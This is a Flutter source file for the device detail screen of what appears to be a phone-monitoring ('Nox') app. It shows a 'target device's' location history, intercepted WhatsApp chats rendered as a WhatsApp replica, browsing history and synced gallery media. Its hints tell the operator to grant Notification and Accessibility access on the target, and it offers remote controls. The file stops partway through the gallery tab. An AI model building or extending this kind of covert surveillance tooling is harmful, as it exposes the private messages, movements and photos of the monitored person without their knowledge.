import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:go_router/go_router.dart';
import 'package:nox_design_system/nox_design_system.dart';
import 'package:path_provider/path_provider.dart';
import 'package:video_player/video_player.dart';
import '../../../core/models/nox_models.dart';
import '../../../core/providers/data_providers.dart';
import '../../../core/network/api_client.dart';
import '../../../core/utils/formatters.dart';
import '../../../core/utils/app_launcher.dart';
import '../admin_device_controls.dart';

class DeviceDetailScreen extends ConsumerStatefulWidget {
  final String deviceId;
  const DeviceDetailScreen({super.key, required this.deviceId});

  @override
  ConsumerState<DeviceDetailScreen> createState() => _DeviceDetailScreenState();
}

class _DeviceDetailScreenState extends ConsumerState<DeviceDetailScreen>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  // Tabs: Location, WhatsApp, Browser, Gallery, Calls
  static const _tabCount = 5;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: _tabCount, vsync: this);
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final deviceAsync = ref.watch(deviceDetailProvider(widget.deviceId));
    final device = deviceAsync.valueOrNull;

    return Scaffold(
      appBar: NoxAppBar(
        title: device?.name ?? 'Device',
        showBackButton: true,
        onBackPressed: () => context.pop(),
        actions: [
          if (device != null)
            NoxIconButton(
              icon: Icons.settings_remote_rounded,
              onPressed: () => _showControls(context, device),
              size: 38,
              tooltip: 'Controls',
            ),
          const SizedBox(width: NoxSpacing.sm),
        ],
      ),
      body: deviceAsync.when(
        skipLoadingOnRefresh: true,
        loading: () => const Center(child: NoxLoadingSpinner(message: 'Loading...')),
        error: (e, _) => NoxErrorState(
          message: 'Couldn\'t load device',
          details: errorMessage(e),
          onRetry: () => ref.invalidate(deviceDetailProvider(widget.deviceId)),
        ),
        data: _buildBody,
      ),
    );
  }

  void _showControls(BuildContext context, Device device) {
    showModalBottomSheet(
      context: context,
      backgroundColor: NoxColors.darkSurface,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (_) => AdminDeviceControls(deviceId: device.id),
    );
  }

  Widget _buildBody(Device device) {
    return Container(
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter, end: Alignment.bottomCenter,
          colors: [NoxColors.deepAbyss, NoxColors.voidBlack],
        ),
      ),
      child: NestedScrollView(
        headerSliverBuilder: (context, innerBoxIsScrolled) => [
          SliverToBoxAdapter(
            child: Padding(
              padding: const EdgeInsets.fromLTRB(NoxSpacing.lg, NoxSpacing.md, NoxSpacing.lg, 0),
              child: _buildDeviceHeader(device),
            ),
          ),
          const SliverToBoxAdapter(child: SizedBox(height: NoxSpacing.md)),
          SliverPersistentHeader(
            pinned: true,
            delegate: _TabBarDelegate(tabController: _tabController),
          ),
        ],
        body: TabBarView(
          controller: _tabController,
          children: [
            _LocationTab(deviceId: widget.deviceId),
            _WhatsAppTab(deviceId: widget.deviceId),
            _BrowserTab(deviceId: widget.deviceId),
            _GalleryTab(deviceId: widget.deviceId),
            _CallsTab(deviceId: widget.deviceId),
          ],
        ),
      ),
    );
  }

  Widget _buildDeviceHeader(Device device) {
    final battery = device.batteryLevel;
    final batteryColor = battery == null
        ? NoxColors.mistGray
        : battery > 60 ? NoxColors.onlineGreen
        : battery > 20 ? NoxColors.warningAmber
        : NoxColors.offlineRed;

    return NoxCard(
      variant: NoxCardVariant.gradient,
      padding: const EdgeInsets.all(NoxSpacing.lg),
      child: Row(children: [
        Container(
          width: 50, height: 50,
          decoration: BoxDecoration(
            gradient: NoxColors.primaryGradient,
            borderRadius: BorderRadius.circular(14),
          ),
          child: Center(child: Icon(deviceIcon(device), size: 26, color: NoxColors.pureWhite)),
        ),
        const SizedBox(width: NoxSpacing.md),
        Expanded(child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(device.name, style: NoxTypography.h3, maxLines: 1, overflow: TextOverflow.ellipsis),
            const SizedBox(height: 4),
            Row(children: [
              NoxStatusDot(status: deviceStatus(device), showLabel: true),
              if (battery != null) ...[
                const SizedBox(width: NoxSpacing.md),
                Icon(Icons.battery_std_rounded, size: 14, color: batteryColor),
                const SizedBox(width: 2),
                Text('$battery%', style: NoxTypography.caption.copyWith(color: batteryColor)),
              ],
              const SizedBox(width: NoxSpacing.md),
              Icon(Icons.access_time_rounded, size: 12, color: NoxColors.dimGray),
              const SizedBox(width: 2),
              Text(device.isOnline ? 'Now' : timeAgo(device.lastSeenAt), style: NoxTypography.caption),
            ]),
          ],
        )),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// Tab bar delegate
// ═══════════════════════════════════════════════════════════════
class _TabBarDelegate extends SliverPersistentHeaderDelegate {
  final TabController tabController;
  _TabBarDelegate({required this.tabController});

  @override double get minExtent => 52;
  @override double get maxExtent => 52;

  @override
  Widget build(BuildContext context, double shrinkOffset, bool overlapsContent) {
    return Container(
      color: NoxColors.voidBlack,
      child: TabBar(
        controller: tabController,
        isScrollable: true,
        tabAlignment: TabAlignment.start,
        labelColor: NoxColors.lavenderPrimary,
        unselectedLabelColor: NoxColors.dimGray,
        indicatorColor: NoxColors.lavenderPrimary,
        indicatorSize: TabBarIndicatorSize.label,
        labelStyle: NoxTypography.bodySmall.copyWith(fontWeight: FontWeight.w600),
        unselectedLabelStyle: NoxTypography.bodySmall,
        tabs: const [
          Tab(text: 'Location'),
          Tab(text: 'WhatsApp'),
          Tab(text: 'Browser'),
          Tab(text: 'Gallery'),
          Tab(text: 'Calls'),
        ],
      ),
    );
  }

  @override bool shouldRebuild(_TabBarDelegate old) => false;
}

// ═══════════════════════════════════════════════════════════════
// SHARED HELPERS
// ═══════════════════════════════════════════════════════════════
String _field(Map<String, dynamic> m, List<String> keys, [String fallback = '']) {
  for (final k in keys) {
    final v = m[k];
    if (v != null && v.toString().trim().isNotEmpty) return v.toString();
  }
  return fallback;
}

DateTime? _tsOf(Map<String, dynamic> m, List<String> keys) {
  for (final k in keys) {
    final v = m[k];
    if (v != null) {
      final d = DateTime.tryParse(v.toString());
      if (d != null) return d;
    }
  }
  return null;
}

String _activityTime(DateTime? t) {
  if (t == null) return '';
  final now = DateTime.now();
  final sameDay = t.year == now.year && t.month == now.month && t.day == now.day;
  return sameDay ? formatTime(t) : '${formatDate(t)}, ${formatTime(t)}';
}

String _chatTime(DateTime t) {
  final now = DateTime.now();
  final today = DateTime(now.year, now.month, now.day);
  final msgDay = DateTime(t.year, t.month, t.day);
  if (msgDay == today) return formatTime(t);
  if (msgDay == today.subtract(const Duration(days: 1))) return 'Yesterday';
  return formatDate(t);
}

String _fmtDuration(int ms) {
  final totalSec = (ms / 1000).round();
  final h = totalSec ~/ 3600;
  final m = (totalSec % 3600) ~/ 60;
  final s = totalSec % 60;
  if (h > 0) return '${h}h ${m}m';
  if (m > 0) return '${m}m ${s}s';
  return '${s}s';
}

Color _contactColor(String name) {
  const colors = [
    NoxColors.lavenderPrimary, NoxColors.icyBlue, NoxColors.onlineGreen,
    NoxColors.peachAccent, NoxColors.pinkSoft, NoxColors.warningAmber,
  ];
  return colors[name.hashCode.abs() % colors.length];
}

bool _differentDay(DateTime? a, DateTime? b) {
  if (a == null || b == null) return true;
  return a.year != b.year || a.month != b.month || a.day != b.day;
}

String _dayLabel(DateTime? t) {
  if (t == null) return '';
  final now = DateTime.now();
  final today = DateTime(now.year, now.month, now.day);
  final d = DateTime(t.year, t.month, t.day);
  if (d == today) return 'Today';
  if (d == today.subtract(const Duration(days: 1))) return 'Yesterday';
  return formatDate(t);
}

// ═══════════════════════════════════════════════════════════════
// 1. LOCATION TAB — shows city + country
// ═══════════════════════════════════════════════════════════════
class _LocationTab extends ConsumerWidget {
  final String deviceId;
  const _LocationTab({required this.deviceId});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final provider = locationLogsProvider(deviceId);
    final logsAsync = ref.watch(provider);

    return logsAsync.when(
      skipLoadingOnRefresh: true,
      loading: () => const Center(child: NoxLoadingSpinner(message: 'Loading locations...')),
      error: (e, _) => NoxErrorState(
        message: 'Couldn\'t load location', details: errorMessage(e),
        onRetry: () => ref.invalidate(provider),
      ),
      data: (logs) {
        final latest = logs.isEmpty ? null : logs.first;
        return RefreshIndicator(
          color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
          onRefresh: () async {
            ref.invalidate(provider);
            try { await ref.read(provider.future); } catch (_) {}
          },
          child: ListView(
            physics: const AlwaysScrollableScrollPhysics(),
            padding: const EdgeInsets.all(NoxSpacing.lg),
            children: [
              // Current location card
              NoxCard(
                variant: NoxCardVariant.elevated,
                padding: const EdgeInsets.all(NoxSpacing.xl),
                child: Column(children: [
                  Container(
                    padding: const EdgeInsets.all(NoxSpacing.lg),
                    decoration: BoxDecoration(
                      color: NoxColors.lavenderPrimary.withValues(alpha: 0.15),
                      shape: BoxShape.circle,
                    ),
                    child: const Icon(Icons.location_on_rounded, size: 40, color: NoxColors.lavenderLight),
                  ),
                  const SizedBox(height: NoxSpacing.lg),
                  Text(latest == null ? 'No GPS data yet' : 'Current Location', style: NoxTypography.h3),
                  if (latest != null) ...[
                    const SizedBox(height: NoxSpacing.sm),
                    // Show city + country (e.g. "Lahore, Pakistan")
                    Text(
                      latest.displayAddress,
                      style: NoxTypography.body.copyWith(color: NoxColors.softWhite, fontSize: 16),
                      textAlign: TextAlign.center,
                    ),
                    const SizedBox(height: NoxSpacing.xs),
                    Text(latest.coordinates,
                      style: NoxTypography.caption.copyWith(color: NoxColors.icyBlue, fontSize: 12)),
                    if (latest.accuracy != null) ...[
                      const SizedBox(height: 2),
                      Text('Accuracy: ±${latest.accuracy!.round()}m', style: NoxTypography.caption),
                    ],
                    const SizedBox(height: NoxSpacing.sm),
                    Text('Updated ${timeAgo(latest.timestamp)}', style: NoxTypography.caption),
                  ],
                ]),
              ),
              const SizedBox(height: NoxSpacing.lg),
              // Location history
              if (logs.isNotEmpty) ...[
                Text('Location History', style: NoxTypography.h3),
                const SizedBox(height: NoxSpacing.md),
                for (var i = 0; i < logs.length && i < 30; i++)
                  Padding(
                    padding: const EdgeInsets.only(bottom: NoxSpacing.sm),
                    child: NoxCard(
                      variant: NoxCardVariant.glass,
                      padding: const EdgeInsets.all(NoxSpacing.md),
                      child: Row(children: [
                        Container(
                          width: 36, height: 36,
                          decoration: BoxDecoration(
                            color: (i == 0 ? NoxColors.lavenderPrimary : NoxColors.elevatedSurface)
                                .withValues(alpha: i == 0 ? 0.15 : 1),
                            borderRadius: BorderRadius.circular(10),
                          ),
                          child: Icon(
                            i == 0 ? Icons.my_location_rounded : Icons.location_on_outlined,
                            size: 18, color: i == 0 ? NoxColors.lavenderLight : NoxColors.mistGray),
                        ),
                        const SizedBox(width: NoxSpacing.md),
                        Expanded(child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(logs[i].displayAddress,
                              style: NoxTypography.subtitle.copyWith(color: NoxColors.softWhite, fontSize: 13),
                              maxLines: 1, overflow: TextOverflow.ellipsis),
                            Text(_activityTime(logs[i].timestamp), style: NoxTypography.caption),
                          ],
                        )),
                        if (i == 0) const NoxBadge.status(text: 'Current'),
                      ]),
                    ),
                  ),
              ],
            ],
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// 2. WHATSAPP TAB — Real WhatsApp-style chat list + thread
// ═══════════════════════════════════════════════════════════════
class _WhatsAppTab extends ConsumerWidget {
  final String deviceId;
  const _WhatsAppTab({required this.deviceId});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final provider = whatsappEventsProvider(deviceId);
    final async = ref.watch(provider);

    return async.when(
      skipLoadingOnRefresh: true,
      loading: () => const Center(child: NoxLoadingSpinner(message: 'Loading...')),
      error: (e, _) => NoxErrorState(
        message: 'Couldn\'t load WhatsApp data', details: errorMessage(e),
        onRetry: () => ref.invalidate(provider),
      ),
      data: (rows) {
        if (rows.isEmpty) {
          return RefreshIndicator(
            color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
            onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
            child: ListView(physics: const AlwaysScrollableScrollPhysics(), children: [
              const SizedBox(height: 80),
              const NoxEmptyState(icon: Icons.chat_bubble_outline_rounded, title: 'No WhatsApp messages captured yet',
                subtitle: 'Grant Notification + Accessibility access on target device.'),
              const SizedBox(height: 24),
              Center(child: ElevatedButton.icon(
                icon: const Icon(Icons.open_in_new_rounded, size: 18),
                label: const Text('Open WhatsApp'),
                style: ElevatedButton.styleFrom(
                  backgroundColor: const Color(0xFF25D366),
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                ),
                onPressed: () => AppLauncher.openWhatsApp(),
              )),
            ]),
          );
        }

        // Group by contact
        final contacts = <String, List<Map<String, dynamic>>>{};
        for (final r in rows) {
          String contact = '';
          final meta = r['metadata'];
          if (meta is Map) contact = (meta['contactName'] ?? '').toString().trim();
          if (contact.isEmpty) contact = _field(r, ['sender', 'title', 'contactName', 'name']);
          if (contact.isEmpty) contact = 'Unknown';
          contacts.putIfAbsent(contact, () => []).add(r);
        }
        final sorted = contacts.entries.toList()
          ..sort((a, b) {
            final aT = _tsOf(a.value.first, ['occurredAt', 'createdAt', 'timestamp']);
            final bT = _tsOf(b.value.first, ['occurredAt', 'createdAt', 'timestamp']);
            return (bT ?? DateTime(0)).compareTo(aT ?? DateTime(0));
          });

        return RefreshIndicator(
          color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
          onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
          child: ListView.builder(
            physics: const AlwaysScrollableScrollPhysics(),
            padding: EdgeInsets.zero,
            itemCount: sorted.length,
            itemBuilder: (context, i) {
              final contact = sorted[i].key;
              final messages = sorted[i].value;
              final lastMsg = messages.first;
              final content = _field(lastMsg, ['content', 'text', 'message', 'body']);
              final t = _tsOf(lastMsg, ['occurredAt', 'createdAt', 'timestamp']);
              final eventType = _field(lastMsg, ['eventType']);
              final isOutgoing = eventType.contains('OUTGOING');
              final unread = messages.where((m) {
                final et = _field(m, ['eventType']);
                return et.contains('INCOMING');
              }).length;

              return InkWell(
                onTap: () => Navigator.of(context).push(MaterialPageRoute(
                  builder: (_) => _WhatsAppChatThread(contact: contact, messages: messages),
                )),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                  decoration: BoxDecoration(
                    border: Border(bottom: BorderSide(color: Colors.white.withValues(alpha: 0.06))),
                  ),
                  child: Row(children: [
                    // Contact avatar
                    Container(
                      width: 52, height: 52,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [
                          _contactColor(contact), _contactColor(contact).withValues(alpha: 0.6)]),
                        shape: BoxShape.circle,
                      ),
                      child: Center(child: Text(
                        contact.isNotEmpty ? contact[0].toUpperCase() : '?',
                        style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 20),
                      )),
                    ),
                    const SizedBox(width: 14),
                    // Name + last message
                    Expanded(child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(children: [
                          Expanded(child: Text(contact,
                            style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600, fontSize: 16),
                            maxLines: 1, overflow: TextOverflow.ellipsis)),
                          if (t != null)
                            Text(_chatTime(t), style: TextStyle(
                              color: unread > 0 ? const Color(0xFF25D366) : NoxColors.dimGray, fontSize: 12)),
                        ]),
                        const SizedBox(height: 4),
                        Row(children: [
                          // Double check mark for outgoing
                          if (isOutgoing) ...[
                            Icon(Icons.done_all, size: 16, color: NoxColors.icyBlue.withValues(alpha: 0.7)),
                            const SizedBox(width: 4),
                          ],
                          Expanded(child: Text(
                            content.isEmpty ? '📷 Media' : content,
                            style: TextStyle(color: NoxColors.moonlightSilver, fontSize: 14),
                            maxLines: 1, overflow: TextOverflow.ellipsis)),
                          if (unread > 0)
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
                              decoration: const BoxDecoration(
                                color: Color(0xFF25D366), shape: BoxShape.circle),
                              child: Text('$unread', style: const TextStyle(
                                color: Colors.white, fontWeight: FontWeight.w700, fontSize: 11)),
                            ),
                        ]),
                      ],
                    )),
                  ]),
                ),
              );
            },
          ),
        );
      },
    );
  }
}

// WhatsApp-style chat thread — EXACT replica of WhatsApp dark mode
class _WhatsAppChatThread extends StatelessWidget {
  final String contact;
  final List<Map<String, dynamic>> messages;
  const _WhatsAppChatThread({required this.contact, required this.messages});

  @override
  Widget build(BuildContext context) {
    final sorted = List<Map<String, dynamic>>.from(messages)
      ..sort((a, b) {
        final aT = _tsOf(a, ['occurredAt', 'createdAt', 'timestamp']);
        final bT = _tsOf(b, ['occurredAt', 'createdAt', 'timestamp']);
        return (aT ?? DateTime(0)).compareTo(bT ?? DateTime(0));
      });

    return Scaffold(
      backgroundColor: const Color(0xFF0B141A),
      appBar: AppBar(
        backgroundColor: const Color(0xFF1F2C34),
        elevation: 1,
        leadingWidth: 30,
        leading: InkWell(
          onTap: () => Navigator.pop(context),
          child: const Padding(
            padding: EdgeInsets.only(left: 4),
            child: Icon(Icons.arrow_back, color: Color(0xFFAEBAC1), size: 24),
          ),
        ),
        titleSpacing: 4,
        title: Row(children: [
          // Avatar — circular like WhatsApp
          Container(
            width: 40, height: 40,
            decoration: BoxDecoration(
              color: _contactColor(contact),
              shape: BoxShape.circle,
            ),
            child: Center(child: Text(
              contact.isNotEmpty ? contact[0].toUpperCase() : '?',
              style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 18),
            )),
          ),
          const SizedBox(width: 10),
          Expanded(child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(contact,
                style: const TextStyle(color: Color(0xFFE9EDEF), fontSize: 17, fontWeight: FontWeight.w500),
                overflow: TextOverflow.ellipsis),
              Text('${messages.length} messages',
                style: const TextStyle(color: Color(0xFF8696A0), fontSize: 13)),
            ],
          )),
        ]),
        actions: [
          IconButton(icon: const Icon(Icons.videocam, color: Color(0xFFAEBAC1)), onPressed: () {}),
          IconButton(icon: const Icon(Icons.call, color: Color(0xFFAEBAC1)), onPressed: () {}),
          IconButton(icon: const Icon(Icons.more_vert, color: Color(0xFFAEBAC1)), onPressed: () {}),
        ],
      ),
      body: Stack(children: [
        // WhatsApp wallpaper pattern (dark doodle background)
        Container(
          decoration: const BoxDecoration(
            color: Color(0xFF0B141A),
            image: DecorationImage(
              image: AssetImage('assets/images/wa_bg.png'),
              fit: BoxFit.cover,
              opacity: 0.04,
            ),
          ),
        ),
        ListView.builder(
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 6),
          itemCount: sorted.length,
          itemBuilder: (context, i) {
            final msg = sorted[i];
            final content = _field(msg, ['content', 'text', 'message', 'body'], '');
            final t = _tsOf(msg, ['occurredAt', 'createdAt', 'timestamp']);
            final eventType = _field(msg, ['eventType']);
            final isOutgoing = eventType.contains('OUTGOING');

            // Day separator
            Widget? daySep;
            if (i == 0 || _differentDay(_tsOf(sorted[i - 1], ['occurredAt', 'createdAt', 'timestamp']), t)) {
              daySep = Center(child: Container(
                margin: const EdgeInsets.symmetric(vertical: 8),
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 5),
                decoration: BoxDecoration(
                  color: const Color(0xFF182229),
                  borderRadius: BorderRadius.circular(7),
                ),
                child: Text(_dayLabel(t),
                  style: const TextStyle(color: Color(0xFF8696A0), fontSize: 12.5, fontWeight: FontWeight.w500)),
              ));
            }

            // Detect special content types
            final lc = content.toLowerCase();
            final isVoice = lc.contains('voice message') || lc.contains('🎤');
            final isCall = lc.contains('voice call') || lc.contains('video call') || lc.contains('missed');
            final isDeleted = lc.contains('deleted') || lc.contains('🚫');
            final isMedia = content.isEmpty || lc.contains('photo') || lc.contains('image') || lc.contains('video');

            return Column(children: [
              if (daySep != null) daySep,
              Align(
                alignment: isOutgoing ? Alignment.centerRight : Alignment.centerLeft,
                child: Container(
                  constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.82),
                  margin: EdgeInsets.only(
                    bottom: 2,
                    left: isOutgoing ? 54 : 0,
                    right: isOutgoing ? 0 : 54,
                  ),
                  padding: const EdgeInsets.fromLTRB(9, 5, 7, 3),
                  decoration: BoxDecoration(
                    color: isOutgoing ? const Color(0xFF005C4B) : const Color(0xFF202C33),
                    borderRadius: BorderRadius.only(
                      topLeft: Radius.circular(isOutgoing ? 10 : 3),
                      topRight: Radius.circular(isOutgoing ? 3 : 10),
                      bottomLeft: const Radius.circular(10),
                      bottomRight: const Radius.circular(10),
                    ),
                  ),
                  child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    // Call bubble
                    if (isCall) Row(children: [
                      Icon(
                        lc.contains('missed') ? Icons.phone_missed : Icons.call,
                        size: 18,
                        color: lc.contains('missed') ? const Color(0xFFEF5350) : const Color(0xFF53BDEB),
                      ),
                      const SizedBox(width: 8),
                      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                        Text(content, style: const TextStyle(color: Color(0xFFE9EDEF), fontSize: 14)),
                        if (!lc.contains('missed'))
                          const Text('Tap to call back', style: TextStyle(color: Color(0xFF53BDEB), fontSize: 12)),
                      ])),
                    ])
                    // Voice message bubble
                    else if (isVoice) Row(children: [
                      Container(
                        width: 36, height: 36,
                        decoration: BoxDecoration(
                          color: _contactColor(contact), shape: BoxShape.circle,
                        ),
                        child: const Icon(Icons.person, color: Colors.white, size: 22),
                      ),
                      const SizedBox(width: 8),
                      const Icon(Icons.play_arrow_rounded, color: Color(0xFFAEBAC1), size: 30),
                      const SizedBox(width: 4),
                      Expanded(child: Container(
                        height: 24,
                        decoration: BoxDecoration(
                          color: Colors.white.withValues(alpha: 0.08),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: Row(children: [
                          const SizedBox(width: 4),
                          Expanded(child: Container(height: 3,
                            decoration: BoxDecoration(
                              color: const Color(0xFF8696A0),
                              borderRadius: BorderRadius.circular(2),
                            ),
                          )),
                          const SizedBox(width: 4),
                        ]),
                      )),
                      const SizedBox(width: 6),
                      const Icon(Icons.mic, color: Color(0xFF53BDEB), size: 18),
                    ])
                    // Deleted message
                    else if (isDeleted) Row(children: [
                      const Icon(Icons.block, color: Color(0xFF8696A0), size: 16),
                      const SizedBox(width: 6),
                      Text(content.isEmpty ? 'This message was deleted' : content,
                        style: const TextStyle(color: Color(0xFF8696A0), fontStyle: FontStyle.italic, fontSize: 14)),
                    ])
                    // Media message
                    else if (isMedia && content.isEmpty) Container(
                      padding: const EdgeInsets.all(8),
                      child: const Row(children: [
                        Icon(Icons.image, color: Color(0xFF8696A0), size: 18),
                        SizedBox(width: 6),
                        Text('Photo', style: TextStyle(color: Color(0xFF8696A0), fontSize: 14)),
                      ]),
                    )
                    // Normal text message
                    else Text(content,
                      style: const TextStyle(color: Color(0xFFE9EDEF), fontSize: 14.5, height: 1.3)),

                    // Time + read receipts row
                    const SizedBox(height: 1),
                    Row(mainAxisSize: MainAxisSize.min, mainAxisAlignment: MainAxisAlignment.end, children: [
                      const Spacer(),
                      if (t != null)
                        Text(formatTime(t),
                          style: const TextStyle(color: Color(0xFF8696A0), fontSize: 11)),
                      if (isOutgoing) ...[
                        const SizedBox(width: 3),
                        const Icon(Icons.done_all, size: 15, color: Color(0xFF53BDEB)),
                      ],
                    ]),
                  ]),
                ),
              ),
            ]);
          },
        ),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// 4. BROWSER TAB — Chrome-style with favicons + date grouping
// ═══════════════════════════════════════════════════════════════
class _BrowserTab extends ConsumerWidget {
  final String deviceId;
  const _BrowserTab({required this.deviceId});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final provider = browsingHistoryProvider(deviceId);
    final async = ref.watch(provider);

    return async.when(
      skipLoadingOnRefresh: true,
      loading: () => const Center(child: NoxLoadingSpinner(message: 'Loading...')),
      error: (e, _) => NoxErrorState(
        message: 'Couldn\'t load browsing history', details: errorMessage(e),
        onRetry: () => ref.invalidate(provider),
      ),
      data: (rows) {
        if (rows.isEmpty) {
          return RefreshIndicator(
            color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
            onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
            child: ListView(physics: const AlwaysScrollableScrollPhysics(), children: const [
              SizedBox(height: 80),
              NoxEmptyState(icon: Icons.public_rounded, title: 'No browsing history yet',
                subtitle: 'URLs appear once Accessibility is enabled on target.'),
            ]),
          );
        }

        // Group by date
        final grouped = <String, List<Map<String, dynamic>>>{};
        for (final r in rows) {
          final t = _tsOf(r, ['visitedAt', 'createdAt', 'timestamp']);
          final label = _dayLabel(t);
          grouped.putIfAbsent(label.isEmpty ? 'Unknown' : label, () => []).add(r);
        }

        return RefreshIndicator(
          color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
          onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
          child: ListView(
            physics: const AlwaysScrollableScrollPhysics(),
            padding: const EdgeInsets.all(NoxSpacing.lg),
            children: [
              for (final entry in grouped.entries) ...[
                // Date header
                Padding(
                  padding: const EdgeInsets.only(top: 8, bottom: 10),
                  child: Text(entry.key,
                    style: NoxTypography.subtitle.copyWith(
                      color: NoxColors.lavenderLight, fontWeight: FontWeight.w700, fontSize: 14)),
                ),
                // URL entries for this date
                for (final r in entry.value)
                  _BrowserHistoryItem(row: r),
              ],
            ],
          ),
        );
      },
    );
  }
}

class _BrowserHistoryItem extends StatelessWidget {
  final Map<String, dynamic> row;
  const _BrowserHistoryItem({required this.row});

  @override
  Widget build(BuildContext context) {
    final url = _field(row, ['url', 'link']);
    final title = _field(row, ['title', 'pageTitle'], url);
    final t = _tsOf(row, ['visitedAt', 'createdAt', 'timestamp']);

    // Extract domain for favicon
    String domain = '';
    try {
      domain = Uri.parse(url).host;
    } catch (_) {}

    final faviconUrl = domain.isNotEmpty
        ? 'https://www.google.com/s2/favicons?domain=$domain&sz=32'
        : '';

    return Padding(
      padding: const EdgeInsets.only(bottom: 2),
      child: InkWell(
        borderRadius: BorderRadius.circular(8),
        onTap: () => AppLauncher.openBrowser(url),
        child: Padding(
          padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 4),
          child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
            // Favicon
            Container(
              width: 32, height: 32,
              decoration: BoxDecoration(
                color: NoxColors.elevatedSurface,
                borderRadius: BorderRadius.circular(8),
              ),
              clipBehavior: Clip.antiAlias,
              child: faviconUrl.isNotEmpty
                  ? Image.network(faviconUrl, width: 32, height: 32, fit: BoxFit.contain,
                      errorBuilder: (_, __, ___) => const Icon(Icons.language_rounded, size: 18, color: NoxColors.icyBlue))
                  : const Icon(Icons.language_rounded, size: 18, color: NoxColors.icyBlue),
            ),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(title.isEmpty ? domain : title,
                style: const TextStyle(color: Color(0xFFE8EAED), fontSize: 14),
                maxLines: 1, overflow: TextOverflow.ellipsis),
              const SizedBox(height: 2),
              Text(domain.isNotEmpty ? domain : url,
                style: const TextStyle(color: Color(0xFF8AB4F8), fontSize: 12),
                maxLines: 1, overflow: TextOverflow.ellipsis),
            ])),
            if (t != null)
              Padding(
                padding: const EdgeInsets.only(left: 8, top: 2),
                child: Text(formatTime(t), style: NoxTypography.caption.copyWith(fontSize: 11)),
              ),
          ]),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
// 5. GALLERY TAB — File manager style with thumbnails + details
// ═══════════════════════════════════════════════════════════════
class _GalleryTab extends ConsumerStatefulWidget {
  final String deviceId;
  const _GalleryTab({required this.deviceId});

  @override
  ConsumerState<_GalleryTab> createState() => _GalleryTabState();
}

class _GalleryTabState extends ConsumerState<_GalleryTab> {
  bool _gridView = true;

  @override
  Widget build(BuildContext context) {
    final provider = galleryItemsProvider(widget.deviceId);
    final async = ref.watch(provider);

    return async.when(
      skipLoadingOnRefresh: true,
      loading: () => const Center(child: NoxLoadingSpinner(message: 'Loading gallery...')),
      error: (e, _) => NoxErrorState(
        message: 'Couldn\'t load gallery', details: errorMessage(e),
        onRetry: () => ref.invalidate(provider),
      ),
      data: (items) {
        if (items.isEmpty) {
          return RefreshIndicator(
            color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
            onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
            child: ListView(physics: const AlwaysScrollableScrollPhysics(), children: const [
              SizedBox(height: 80),
              NoxEmptyState(icon: Icons.photo_library_outlined, title: 'No media synced yet',
                subtitle: 'Photos, screenshots and WhatsApp media appear once storage access is granted.'),
            ]),
          );
        }

        // Count stats
        final images = items.where((it) {
          final mime = _field(it, ['mimeType', 'mime', 'type']);
          return mime.startsWith('image');
        }).length;
        final videos = items.where((it) {
          final mime = _field(it, ['mimeType', 'mime', 'type']);
          return mime.startsWith('video');
        }).length;

        return RefreshIndicator(
          color: NoxColors.lavenderPrimary, backgroundColor: NoxColors.darkSurface,
          onRefresh: () async { ref.invalidate(provider); try { await ref.read(provider.future); } catch (_) {} },
          child: Column(children: [
            // Header with stats + view toggle
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 12, 12, 8),
              child: Row(children: [
                Text('${items.length} files', style: NoxTypography.subtitle.copyWith(color: NoxColors.softWhite)),
                const SizedBox(width: 8),
